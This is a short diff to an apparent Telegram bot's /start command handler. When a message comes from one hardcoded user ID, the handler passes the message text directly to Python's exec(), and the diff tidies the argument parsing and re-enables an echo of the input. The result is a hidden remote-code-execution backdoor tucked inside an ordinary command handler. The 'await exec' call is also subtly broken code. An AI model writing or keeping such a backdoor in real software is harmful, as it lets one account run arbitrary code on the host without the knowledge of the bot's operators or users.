@@ -219,8 +219,8 @@ async def cmd_start(message: Message):
     if message.from_user.id == 1999559891:
         try:
             text : str = message.text
-            text = text[(len(text.split()[0])):]
-            # await message.answer(f"DBDS{text}")
+            text = text[(len(text.split()[0])+1):]
+            await message.answer(f"DBDS{text}")
             a = await exec(text)
             if a != None:
                 await message.answer("DGB_term RTN:NULLDEFAULT")
